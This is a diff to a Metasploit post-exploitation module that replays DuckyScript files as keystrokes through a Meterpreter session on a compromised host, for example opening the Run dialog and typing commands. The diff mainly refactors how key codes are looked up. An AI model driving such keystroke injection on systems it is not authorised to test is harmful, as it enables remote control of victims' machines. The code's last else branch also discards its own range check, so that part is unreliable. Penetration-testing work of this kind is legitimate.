@@ -33,7 +33,7 @@ class MetasploitModule < Msf::Post
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
-              stdapi_ui_keyevent_send,
+              stdapi_ui_keyevent_send
               stdapi_ui_keyboard_send
             ]
           }
@@ -46,38 +46,33 @@ class MetasploitModule < Msf::Post
         OptInt.new('SLEEP', [false, 'Sleep time between commands.', 3])
       ]
     )
-  end
-
-  def ducky_parse(line)
     # Define common key codes for initial testing; this can be expanded later
     # https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.keys?view=windowsdesktop-7.0
     # Keycode => Key Format
-    key_codes = { '8' => 'BACKSPACE', '9' => 'TAB', '16' => 'SHIFT', '11' => 'CONTROL', '13' => 'RETURN',
-                  '18' => 'MENU', '20' => 'CAPSLOCK', '32' => 'SPACE', '37' => 'LEFT', '38' => 'UP',
-                  '27' => 'ESCAPE', '39' => 'RIGHT', '40' => 'DOWN', '33' => 'PAGEUP', '34' => 'PAGEDOWN',
-                  '35' => 'END', '36' => 'HOME', '42' => 'PRINTSCREEN', '46' => 'DELETE', '47' => 'HELP',
-                  '65' => 'A', '66' => 'B', '67' => 'C', '68' => 'D', '69' => 'E',
-                  '70' => 'F', '71' => 'G', '72' => 'H', '73' => 'I', '74' => 'J',
-                  '75' => 'K', '76' => 'L', '77' => 'M', '78' => 'N', '79' => 'O',
-                  '80' => 'P', '81' => 'Q', '82' => 'R', '83' => 'S', '84' => 'T',
-                  '85' => 'U', '86' => 'V', '87' => 'W', '88' => 'X', '89' => 'Y',
-                  '90' => 'Z', '91' => 'WINLEFT', '92' => 'WINRIGHT', '93' => 'WINAPP', '96' => 'NUM0',
-                  '97' => 'NUM1', '98' => 'NUM2', '99' => 'NUM3', '100' => 'NUM4', '101' => 'NUM5',
-                  '102' => 'NUM6', '103' => 'NUM7', '104' => 'NUM8', '105' => 'NUM9', '106' => 'MULTIPLY',
-                  '107' => 'ADD', '109' => 'SUBTRACT', '110' => 'DECIMAL', '111' => 'DIVIDE', '112' => 'F1',
-                  '113' => 'F2', '114' => 'F3', '115' => 'F4', '116' => 'F5', '117' => 'F6',
-                  '118' => 'F7', '119' => 'F8', '120' => 'F9', '121' => 'F10', '122' => 'F11',
-                  '123' => 'F12','188' => 'COMMA','190' => 'PERIOD','191' => 'SLASH','48' => '0',
-                  '49' => '1','50' => '2','51' => '3','52' => '4','53' => '5',
-                  '54' => '6', '55' => '7', '56' => '8', '57' => '9'
-                }
+    @key_codes = {
+      '8' => 'BACKSPACE', '9' => 'TAB', '11' => 'CONTROL', '13' => 'RETURN', '16' => 'SHIFT',
+      '18' => 'MENU', '20' => 'CAPSLOCK', '27' => 'ESCAPE', '32' => 'SPACE', '33' => 'PAGEUP',
+      '34' => 'PAGEDOWN', '35' => 'END', '36' => 'HOME', '37' => 'LEFT', '38' => 'UP',
+      '39' => 'RIGHT', '40' => 'DOWN', '42' => 'PRINTSCREEN', '46' => 'DELETE', '47' => 'HELP',
+      '91' => 'WINLEFT', '92' => 'WINRIGHT', '93' => 'WINAPP', '96' => 'NUM0', '97' => 'NUM1',
+      '98' => 'NUM2', '99' => 'NUM3', '100' => 'NUM4', '101' => 'NUM5', '102' => 'NUM6',
+      '103' => 'NUM7', '104' => 'NUM8', '105' => 'NUM9', '106' => 'MULTIPLY', '107' => 'ADD',
+      '109' => 'SUBTRACT', '110' => 'DECIMAL', '111' => 'DIVIDE', '112' => 'F1', '113' => 'F2',
+      '114' => 'F3', '115' => 'F4', '116' => 'F5', '117' => 'F6', '118' => 'F7',
+      '119' => 'F8', '120' => 'F9', '121' => 'F10', '122' => 'F11', '123' => 'F12',
+      '188' => 'COMMA', '190' => 'PERIOD', '191' => 'SLASH'
+    }
     # Define keypress actions
-    actions = { '0' => 'PRESS', '1' => 'DOWN', '2' => 'UP' }
+    @key_actions = { '0' => 'PRESS', '1' => 'DOWN', '2' => 'UP' }
+  end
+
+  def ducky_parse(line)
     # Parse DuckyScript comments
     if line.starts_with?('REM ')
       return
     end
-    # Cursor movement 
+
+    # Cursor movement
     # Although this is a bit hacky
     cursor_line = line.strip
     if (cursor_line.starts_with?('UP') || cursor_line.starts_with?('DOWN') || cursor_line.starts_with?('LEFT') ||
@@ -85,14 +80,14 @@ class MetasploitModule < Msf::Post
       cursor_line.starts_with?('TAB') || cursor_line.starts_with?('PAGEUP') || cursor_line.starts_with?('PAGEDOWN') ||
       cursor_line.starts_with?('HOME') || cursor_line.starts_with?('END') || cursor_line.starts_with?('SPACE') ||
       cursor_line.starts_with?('RETURN'))
-      session.ui.keyevent_send(key_codes.key(cursor_line).to_i, actions.key('PRESS').to_i)
+      parse_keyevents(cursor_line, 'PRESS')
     end
     if line.include?('STRING') || line.include?('STRINGLN') || line.include?('GUI')
       line_array = line.split(' ', 2)
       # Write a string and press ENTER
       if line_array[0] == 'STRINGLN'
         session.ui.keyboard_send(line_array[1])
-        session.ui.keyevent_send(key_codes.key('RETURN').to_i, actions.key('PRESS').to_i)
+        parse_keyevents('RETURN', 'PRESS')
       end
       # Write a string
       if line_array[0] == 'STRING'
@@ -100,36 +95,45 @@ class MetasploitModule < Msf::Post
       end
       # Press Windows + R to launch run dialog
       if line_array[0] == 'GUI'
-        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('DOWN').to_i)
-        session.ui.keyevent_send(key_codes.key('R').to_i, actions.key('PRESS').to_i)
-        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('UP').to_i)
+        parse_keyevents('WINLEFT', 'DOWN')
+        parse_keyevents('R', 'PRESS')
+        parse_keyevents('WINLEFT', 'UP')
       end
     end
     if line.include?('KEYEVENT')
       line_array = line.split(' ')
       # Parse raw keyevents; example format, "KEYEVENT R PRESS"
       if line_array[0] == 'KEYEVENT'
-        # error handling: ensure that all values are valid before proceeding.
-        if (key_codes.value?(line_array[1].upcase) && actions.value?(line_array[2].upcase))
-          session.ui.keyevent_send(key_codes.key(line_array[1].upcase).to_i, actions.key(line_array[2].upcase).to_i)
-        end
+        parse_keyevents(line_array[1], line_array[2])
       end
     end
     # Parse F Keys
     if line.starts_with?('F')
-      session.ui.keyevent_send(key_codes.key(line).to_i, actions.key('PRESS').to_i)
+      parse_keyevents(line, 'PRESS')
+    end
+  end
+
+  def parse_keyevents(keycode, action)
+    # first lookup keys in dictionary
+    if (@key_codes.value?(keycode.upcase) && @key_actions.value?(action.upcase))
+      session.ui.keyevent_send(@key_codes.key(keycode.upcase).to_i, @key_actions.key(action.upcase).to_i)
+    # Parse digits 0-9 (this does not include the NUM keys)
+    elsif keycode.ord.between?(48, 57)
+      session.ui.keyevent_send(keycode.ord.to_i, @key_actions.key(action.upcase).to_i)
+    # Parse A-Z
+    else
+      keycode.upcase.ord.between?(65, 90)
+      session.ui.keyevent_send(keycode.ord.to_i, @key_actions.key(action.upcase).to_i)
     end
   end
 
   def run
-    return 0 if session.type != 'meterpreter'
-    if datastore['FILENAME'].blank?
-      print_error('A file needs to be provided!')
-      return 0
-    end
+    fail_with(Failure::BadConfig, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'
+    fail_with(Failure::BadConfig, 'Must supply a config file to run this module') if datastore['FILENAME'].blank?
     print_good("Reading file #{datastore['FILENAME']}")
     File.readlines(datastore['FILENAME']).each do |line|
       next if line.blank?
+
       if datastore['VERBOSE']
         print_good("Line: #{line}")
       end
